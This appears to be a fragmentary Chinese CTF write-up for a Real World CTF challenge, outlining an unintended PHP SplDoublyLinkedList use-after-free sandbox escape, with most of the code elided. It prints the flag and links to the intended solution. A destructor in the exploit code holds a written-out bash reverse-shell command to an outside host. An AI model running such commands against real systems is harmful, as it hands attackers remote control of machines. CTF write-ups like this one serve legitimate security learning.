...
非預期解: PHP SplDoublyLinkedList UAF Sandbox Escape
...
class UAFTrigger
{
    function __destruct()
    {
        ...
        $rw_dll[1]("bash -c 'bash -i >& /dev/tcp/kaibro.tw/5278 0>&1'");
...
`rwctf{&$flag=0xdeadbeef;echo $flag;}`

--

預期解: https://forum.90sec.com/t/topic/1520
